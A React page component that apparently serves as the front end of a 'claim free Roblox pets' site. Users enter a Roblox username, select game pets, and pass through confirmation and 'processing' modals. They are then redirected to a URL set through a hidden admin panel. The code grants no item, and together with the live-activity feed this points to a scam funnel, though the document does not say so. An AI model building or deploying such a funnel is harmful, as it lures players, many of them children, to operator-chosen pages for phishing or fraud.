import { useState } from 'react';
import Header from '@/components/Header';
import RobloxAccount from '@/components/RobloxAccount';
import PetGrid from '@/components/PetGrid';
import SelectedItems from '@/components/SelectedItems';
import LiveActivity from '@/components/LiveActivity';
import ConfirmSelectionModal from '@/components/ConfirmSelectionModal';
import ProcessingModal from '@/components/ProcessingModal';
import ReadyToClaimModal from '@/components/ReadyToClaimModal';
import AdminPanel from '@/components/AdminPanel';

interface SelectedPet {
  id: string;
  name: string;
  quantity: number;
}

interface RobloxProfile {
  username: string;
  userId: string;
  joinDate: string;
  avatarUrl?: string;
}

export default function Home() {
  const [selectedPets, setSelectedPets] = useState<Record<string, number>>({});
  const [profile, setProfile] = useState<RobloxProfile | null>(null);
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showProcessingModal, setShowProcessingModal] = useState(false);
  const [showReadyModal, setShowReadyModal] = useState(false);
  const [showAdminPanel, setShowAdminPanel] = useState(false);

  // Get redirect URL from localStorage
  const getRedirectUrl = () => {
    try {
      const saved = localStorage.getItem('admin-redirect-urls');
      if (saved) {
        const urls = JSON.parse(saved);
        return urls[0] || 'https://www.roblox.com';
      }
    } catch (error) {
      console.error('Failed to load redirect URL:', error);
    }
    return 'https://www.roblox.com';
  };

  const selectedCount = Object.values(selectedPets).reduce((sum, qty) => sum + qty, 0);
  
  const selectedPetsList: SelectedPet[] = Object.entries(selectedPets)
    .filter(([_, quantity]) => quantity > 0)
    .map(([id, quantity]) => {
      // todo: remove mock functionality - get real pet names from data
      const petNames: Record<string, string> = {
        'trex': 'T-Rex',
        'raccoon': 'Raccoon',
        'fennec': 'Fennec Fox',
        'kitsune': 'Kitsune',
        'red-dragon': 'Red Dragon',
        'mimic': 'Mimic Octopus',
        'disco-bee': 'Disco Bee',
        'queen-bee': 'Queen Bee',
      };
      
      return {
        id,
        name: petNames[id] || id,
        quantity
      };
    });

  const handleClaimSelected = () => {
    if (!profile) {
      alert('Please save your Roblox username first!');
      return;
    }
    if (selectedCount === 0) {
      alert('Please select at least one pet!');
      return;
    }
    console.log('Starting claim process...');
    setShowConfirmModal(true);
  };

  const handleConfirmSelection = () => {
    console.log('Selection confirmed, starting processing...');
    setShowConfirmModal(false);
    setShowProcessingModal(true);
  };

  const handleProcessingAccept = () => {
    console.log('Processing accepted, ready to claim...');
    setShowProcessingModal(false);
    setShowReadyModal(true);
  };

  return (
    <div className="min-h-screen bg-background" data-testid="page-home">
      <Header />
      
      <main className="max-w-6xl mx-auto p-6">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Main Content */}
          <div className="lg:col-span-2 space-y-6">
            <RobloxAccount onProfileLoaded={setProfile} />
            <PetGrid onSelectionChange={setSelectedPets} />
          </div>
          
          {/* Sidebar */}
          <div className="space-y-6">
            <SelectedItems 
              selectedCount={selectedCount} 
              onClaimSelected={handleClaimSelected}
            />
            <LiveActivity />
          </div>
        </div>
      </main>

      {/* Modals */}
      <ConfirmSelectionModal
        isOpen={showConfirmModal}
        onClose={() => setShowConfirmModal(false)}
        onConfirm={handleConfirmSelection}
        selectedPets={selectedPetsList}
        username={profile?.username || ''}
      />
      
      <ProcessingModal
        isOpen={showProcessingModal}
        onClose={() => setShowProcessingModal(false)}
        onAccept={handleProcessingAccept}
      />
      
      <ReadyToClaimModal
        isOpen={showReadyModal}
        onClose={() => setShowReadyModal(false)}
        redirectUrl={getRedirectUrl()}
      />

      {/* Admin Panel */}
      <AdminPanel
        isVisible={showAdminPanel}
        onToggle={() => setShowAdminPanel(!showAdminPanel)}
      />
    </div>
  );
}